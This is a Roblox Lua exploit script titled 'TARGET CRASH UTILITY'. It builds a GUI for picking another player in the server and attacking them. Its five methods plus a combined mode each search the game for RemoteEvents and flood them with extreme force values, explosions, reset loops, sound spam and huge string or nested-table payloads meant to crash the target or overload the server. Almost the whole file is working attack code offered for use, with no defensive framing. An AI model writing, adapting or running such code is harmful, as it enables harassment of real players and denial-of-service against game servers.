-- GUI with server player picker
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer.PlayerGui
screenGui.Name = "CrashUtility"

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 450)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -225)
mainFrame.BackgroundColor3 = Color3.new(0.05, 0.05, 0.1)
mainFrame.BackgroundTransparency = 0.15
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "⚡ TARGET CRASH UTILITY ⚡"
title.TextColor3 = Color3.new(1, 0.2, 0.2)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = mainFrame

-- Player list container
local playerContainer = Instance.new("ScrollingFrame")
playerContainer.Size = UDim2.new(0.9, 0, 0, 200)
playerContainer.Position = UDim2.new(0.05, 0, 0, 50)
playerContainer.BackgroundColor3 = Color3.new(0.1, 0.1, 0.15)
playerContainer.BorderSizePixel = 1
playerContainer.BorderColor3 = Color3.new(0.3, 0.3, 0.5)
playerContainer.Parent = mainFrame

local playerLayout = Instance.new("UIListLayout")
playerLayout.SortOrder = Enum.SortOrder.Name
playerLayout.Padding = UDim.new(0, 2)
playerLayout.Parent = playerContainer

-- Selected player display
local selectedLabel = Instance.new("TextLabel")
selectedLabel.Size = UDim2.new(0.9, 0, 0, 30)
selectedLabel.Position = UDim2.new(0.05, 0, 0, 260)
selectedLabel.Text = "Selected: None"
selectedLabel.TextColor3 = Color3.new(0.8, 0.8, 1)
selectedLabel.BackgroundColor3 = Color3.new(0.15, 0.15, 0.2)
selectedLabel.Parent = mainFrame

-- Method selector dropdown (simulated)
local methodLabel = Instance.new("TextLabel")
methodLabel.Size = UDim2.new(0.4, 0, 0, 25)
methodLabel.Position = UDim2.new(0.05, 0, 0, 295)
methodLabel.Text = "Method:"
methodLabel.TextColor3 = Color3.new(0.8, 0.8, 1)
methodLabel.TextXAlignment = Enum.TextXAlignment.Left
methodLabel.Parent = mainFrame

local methodButtons = {}
local methods = {"Knockback", "Explosion", "Character Reset", "GUI Overload", "Sound Spam"}
local selectedMethod = methods[1]

for i, methodName in ipairs(methods) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.18, 0, 0, 25)
    btn.Position = UDim2.new(0.05 + (i-1) * 0.19, 0, 0, 325)
    btn.Text = methodName
    btn.TextSize = 10
    btn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.3)
    btn.Parent = mainFrame
    
    btn.MouseButton1Click:Connect(function()
        selectedMethod = methodName
        for _, b in ipairs(methodButtons) do
            b.BackgroundColor3 = Color3.new(0.2, 0.2, 0.3)
        end
        btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.8)
    end)
    table.insert(methodButtons, btn)
end

-- Execute button
local crashBtn = Instance.new("TextButton")
crashBtn.Size = UDim2.new(0.9, 0, 0, 50)
crashBtn.Position = UDim2.new(0.05, 0, 0, 360)
crashBtn.Text = "🔥 EXECUTE CRASH 🔥"
crashBtn.TextColor3 = Color3.new(1, 1, 1)
crashBtn.Font = Enum.Font.GothamBold
crashBtn.TextSize = 16
crashBtn.BackgroundColor3 = Color3.new(0.6, 0, 0)
crashBtn.Parent = mainFrame

-- Status label
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0.9, 0, 0, 30)
statusLabel.Position = UDim2.new(0.05, 0, 0, 415)
statusLabel.Text = "Status: Idle"
statusLabel.TextColor3 = Color3.new(0.5, 1, 0.5)
statusLabel.Parent = mainFrame

-- Store selected player
local selectedPlayer = nil

-- Populate player list
local function refreshPlayerList()
    -- Clear existing buttons
    for _, child in ipairs(playerContainer:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer then
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, -4, 0, 30)
            btn.Text = player.Name .. " (Level " .. (player.leaderstats and player.leaderstats.Level and player.leaderstats.Level.Value or "?") .. ")"
            btn.BackgroundColor3 = Color3.new(0.15, 0.15, 0.25)
            btn.TextColor3 = Color3.new(0.9, 0.9, 1)
            btn.TextXAlignment = Enum.TextXAlignment.Left
            btn.Parent = playerContainer
            
            btn.MouseButton1Click:Connect(function()
                selectedPlayer = player
                selectedLabel.Text = "Selected: " .. player.Name .. " (ID: " .. player.UserId .. ")"
                selectedLabel.TextColor3 = Color3.new(0.3, 1, 0.3)
                -- Highlight
                for _, child in ipairs(playerContainer:GetChildren()) do
                    if child:IsA("TextButton") then
                        child.BackgroundColor3 = Color3.new(0.15, 0.15, 0.25)
                    end
                end
                btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.6)
            end)
        end
    end
    
    -- If no players found, show message
    if #playerContainer:GetChildren() == 0 then
        local msg = Instance.new("TextLabel")
        msg.Size = UDim2.new(1, 0, 1, 0)
        msg.Text = "No other players online"
        msg.TextColor3 = Color3.new(0.5, 0.5, 0.5)
        msg.BackgroundTransparency = 1
        msg.Parent = playerContainer
    end
end

refreshPlayerList()

-- Refresh button
local refreshBtn = Instance.new("TextButton")
refreshBtn.Size = UDim2.new(0.15, 0, 0, 25)
refreshBtn.Position = UDim2.new(0.8, 0, 0, 260)
refreshBtn.Text = "⟳"
refreshBtn.TextSize = 18
refreshBtn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.3)
refreshBtn.Parent = mainFrame

refreshBtn.MouseButton1Click:Connect(function()
    refreshPlayerList()
    statusLabel.Text = "Status: Refreshed"
    statusLabel.TextColor3 = Color3.new(0.5, 1, 0.5)
end)

-- Auto-refresh on player join/leave
game.Players.PlayerAdded:Connect(function()
    refreshPlayerList()
end)

game.Players.PlayerRemoving:Connect(function()
    refreshPlayerList()
end)

---

### CRASH METHODS IMPLEMENTATION

-- Method 1: Extreme Knockback
local function crashViaKnockback(target)
    statusLabel.Text = "Status: Applying knockback to " .. target.Name
    statusLabel.TextColor3 = Color3.new(1, 1, 0)
    
    -- Find all possible knockback remotes
    local knockbackRemotes = {}
    for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            if obj.Name:lower():find("knockback") or 
               obj.Name:lower():find("force") or 
               obj.Name:lower():find("push") or
               obj.Name:lower():find("launch") or
               obj.Name:lower():find("damage") then
                table.insert(knockbackRemotes, obj)
            end
        end
    end
    
    -- Also check workspace and game for remotes
    for _, obj in ipairs(game:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and 
           not table.find(knockbackRemotes, obj) then
            if obj.Name:lower():find("remote") or 
               obj.Name:lower():find("event") or
               obj.Name:lower():find("fire") then
                table.insert(knockbackRemotes, obj)
            end
        end
    end
    
    if #knockbackRemotes == 0 then
        statusLabel.Text = "Status: No knockback remotes found!"
        statusLabel.TextColor3 = Color3.new(1, 0, 0)
        return false
    end
    
    -- Spam knockback with extreme values
    for i = 1, 100 do
        for _, remote in ipairs(knockbackRemotes) do
            pcall(function()
                -- Try different argument patterns
                remote:FireServer(target, Vector3.new(1e6, 1e6, 1e6))
                remote:FireServer(target.Name, Vector3.new(1e9, 1e9, 1e9))
                remote:FireServer(target.Character, Vector3.new(1e10, 1e10, 1e10))
                remote:FireServer(target.UserId, 1e12, 1e12, 1e12)
                remote:FireServer({Target = target, Force = Vector3.new(1e10, 1e10, 1e10)})
            end)
        end
        wait(0.01)
    end
    
    statusLabel.Text = "Status: Knockback spam sent to " .. target.Name
    statusLabel.TextColor3 = Color3.new(0, 1, 0)
    return true
end

-- Method 2: Explosion Overload
local function crashViaExplosion(target)
    statusLabel.Text = "Status: Explosion spamming " .. target.Name
    statusLabel.TextColor3 = Color3.new(1, 1, 0)
    
    -- Find explosion remotes
    local explosionRemotes = {}
    for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") and 
           (obj.Name:lower():find("explosion") or 
            obj.Name:lower():find("blast") or 
            obj.Name:lower():find("boom")) then
            table.insert(explosionRemotes, obj)
        end
    end
    
    if #explosionRemotes == 0 then
        -- Fallback: Try to create actual explosions at target
        for i = 1, 500 do
            local explosion = Instance.new("Explosion")
            explosion.BlastRadius = 1000
            explosion.BlastPressure = 1000000
            explosion.Position = target.Character and target.Character.HumanoidRootPart.Position or 
                                 Vector3.new(0, 1000, 0) + Vector3.new(i * 10, 0, 0)
            explosion.Parent = workspace
            wait(0.001)
        end
        statusLabel.Text = "Status: Local explosions created near " .. target.Name
        statusLabel.TextColor3 = Color3.new(0, 1, 0)
        return true
    end
    
    for i = 1, 100 do
        for _, remote in ipairs(explosionRemotes) do
            pcall(function()
                remote:FireServer(target, CFrame.new(1e6, 1e6, 1e6), 1000, 1000000)
                remote:FireServer(target.Name, Vector3.new(1e9, 1e9, 1e9), 100000)
            end)
        end
        wait(0.01)
    end
    
    statusLabel.Text = "Status: Explosion spam sent"
    statusLabel.TextColor3 = Color3.new(0, 1, 0)
    return true
end

-- Method 3: Character Reset Loop
local function crashViaCharacterReset(target)
    statusLabel.Text = "Status: Resetting " .. target.Name .. " repeatedly"
    statusLabel.TextColor3 = Color3.new(1, 1, 0)
    
    local resetRemotes = {}
    for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") and 
           (obj.Name:lower():find("reset") or 
            obj.Name:lower():find("respawn") or 
            obj.Name:lower():find("spawn") or
            obj.Name:lower():find("revive")) then
            table.insert(resetRemotes, obj)
        end
    end
    
    -- Also check game.Players for reset functions
    if #resetRemotes == 0 then
        -- Try direct character removal
        for i = 1, 1000 do
            pcall(function()
                if target.Character then
                    target.Character:BreakJoints()
                    target.Character.Humanoid.Health = 0
                    target.Character:Destroy()
                end
            end)
            wait(0.001)
        end
        statusLabel.Text = "Status: Character break loop executed"
        statusLabel.TextColor3 = Color3.new(0, 1, 0)
        return true
    end
    
    for i = 1, 200 do
        for _, remote in ipairs(resetRemotes) do
            pcall(function()
                remote:FireServer(target)
                remote:FireServer(target.Name)
                remote:FireServer(target.UserId)
            end)
        end
        wait(0.005)
    end
    
    statusLabel.Text = "Status: Reset spam sent"
    statusLabel.TextColor3 = Color3.new(0, 1, 0)
    return true
end

-- Method 4: GUI Overload (most effective)
local function crashViaGUIOverload(target)
    statusLabel.Text = "Status: GUI overloading " .. target.Name
    statusLabel.TextColor3 = Color3.new(1, 1, 0)
    
    -- Find GUI creation remotes (common in games with custom UIs)
    local guiRemotes = {}
    for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") and 
           (obj.Name:lower():find("gui") or 
            obj.Name:lower():find("ui") or 
            obj.Name:lower():find("menu") or
            obj.Name:lower():find("popup") or
            obj.Name:lower():find("notification") or
            obj.Name:lower():find("display")) then
            table.insert(guiRemotes, obj)
        end
    end
    
    if #guiRemotes == 0 then
        -- Try to find any remote that might accept UI creation
        for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
            if obj:IsA("RemoteEvent") then
                table.insert(guiRemotes, obj)
            end
        end
    end
    
    -- Create massive payload
    local payload = string.rep("A", 50000)
    local nestedPayload = {}
    for i = 1, 100 do
        nestedPayload[i] = {
            Name = "Frame_" .. i,
            Size = UDim2.new(1000, i, 1000, i),
            Position = UDim2.new(i, 0, i, 0),
            Text = string.rep("X", 10000),
            Children = nestedPayload
        }
    end
    
    for i = 1, 50 do
        for _, remote in ipairs(guiRemotes) do
            pcall(function()
                remote:FireServer(target, payload)
                remote:FireServer(target.Name, payload)
                remote:FireServer(target.UserId, nestedPayload)
                remote:FireServer({Target = target, Data = payload})
            end)
        end
        wait(0.005)
    end
    
    statusLabel.Text = "Status: GUI overload sent"
    statusLabel.TextColor3 = Color3.new(0, 1, 0)
    return true
end

-- Method 5: Sound Spam
local function crashViaSoundSpam(target)
    statusLabel.Text = "Status: Sound spamming " .. target.Name
    statusLabel.TextColor3 = Color3.new(1, 1, 0)
    
    -- Find sound remotes
    local soundRemotes = {}
    for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") and 
           (obj.Name:lower():find("sound") or 
            obj.Name:lower():find("audio") or 
            obj.Name:lower():find("music")) then
            table.insert(soundRemotes, obj)
        end
    end
    
    if #soundRemotes == 0 then
        -- Try creating local sounds
        for i = 1, 100 do
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://" .. string.rep("1", 10000)
            sound.Volume = 1000
            sound.PlayOnRemove = true
            sound.Parent = workspace
            sound:Play()
            wait(0.001)
        end
        statusLabel.Text = "Status: Local sound spam created"
        statusLabel.TextColor3 = Color3.new(0, 1, 0)
        return true
    end
    
    for i = 1, 100 do
        for _, remote in ipairs(soundRemotes) do
            pcall(function()
                remote:FireServer(target, "rbxassetid://" .. string.rep("1", 100000), 1000)
                remote:FireServer(target.Name, string.rep("A", 50000), 100000)
            end)
        end
        wait(0.005)
    end
    
    statusLabel.Text = "Status: Sound spam sent"
    statusLabel.TextColor3 = Color3.new(0, 1, 0)
    return true
end

-- Combined attack (most effective)
local function crashViaCombined(target)
    statusLabel.Text = "Status: Combined attack on " .. target.Name
    statusLabel.TextColor3 = Color3.new(1, 0.5, 0)
    
    -- Spawn multiple threads
    local threads = {}
    table.insert(threads, coroutine.create(function() crashViaKnockback(target) end))
    table.insert(threads, coroutine.create(function() crashViaExplosion(target) end))
    table.insert(threads, coroutine.create(function() crashViaCharacterReset(target) end))
    table.insert(threads, coroutine.create(function() crashViaGUIOverload(target) end))
    table.insert(threads, coroutine.create(function() crashViaSoundSpam(target) end))
    
    for _, thread in ipairs(threads) do
        coroutine.resume(thread)
    end
    
    statusLabel.Text = "Status: Combined attack launched on " .. target.Name
    statusLabel.TextColor3 = Color3.new(0, 1, 0)
    return true
end

-- Main execute function
crashBtn.MouseButton1Click:Connect(function()
    if not selectedPlayer then
        statusLabel.Text = "Status: ERROR - No player selected!"
        statusLabel.TextColor3 = Color3.new(1, 0, 0)
        return
    end
    
    -- Check if player still exists
    if not game.Players:FindFirstChild(selectedPlayer.Name) then
        statusLabel.Text = "Status: Player " .. selectedPlayer.Name .. " left the game!"
        statusLabel.TextColor3 = Color3.new(1, 0, 0)
        selectedPlayer = nil
        selectedLabel.Text = "Selected: None"
        return
    end
    
    -- Execute selected method
    local success = false
    if selectedMethod == "Knockback" then
        success = crashViaKnockback(selectedPlayer)
    elseif selectedMethod == "Explosion" then
        success = crashViaExplosion(selectedPlayer)
    elseif selectedMethod == "Character Reset" then
        success = crashViaCharacterReset(selectedPlayer)
    elseif selectedMethod == "GUI Overload" then
        success = crashViaGUIOverload(selectedPlayer)
    elseif selectedMethod == "Sound Spam" then
        success = crashViaSoundSpam(selectedPlayer)
    else
        success = crashViaCombined(selectedPlayer)
    end
    
    if success then
        statusLabel.Text = "Status: ✅ Attack complete on " .. selectedPlayer.Name
        statusLabel.TextColor3 = Color3.new(0, 1, 0)
    else
        statusLabel.Text = "Status: ❌ Attack failed on " .. selectedPlayer.Name
        statusLabel.TextColor3 = Color3.new(1, 0, 0)
    end
end)

-- Hotkey support
game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Insert then
        crashBtn.MouseButton1Click:Fire()
    end
    if input.KeyCode == Enum.KeyCode.Home then
        refreshPlayerList()
    end
end)
